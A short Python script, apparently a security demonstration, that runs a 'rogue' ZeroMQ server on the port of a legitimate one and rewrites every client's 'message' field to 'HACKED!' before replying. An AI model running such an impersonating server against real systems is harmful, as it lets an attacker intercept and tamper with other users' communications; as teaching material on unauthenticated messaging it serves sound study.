import zmq
import msgpack

context = zmq.Context()
socket = context.socket(zmq.REP)
socket.bind("tcp://*:6666")  # Écoute sur le même port que le serveur normal

print("Rogue server running...")

while True:
    message = socket.recv()
    frame = msgpack.unpackb(message)
    if "message" in frame:
        frame["message"] = "HACKED!"  # Modifie les messages envoyés par les clients
    socket.send(msgpack.packb(frame))
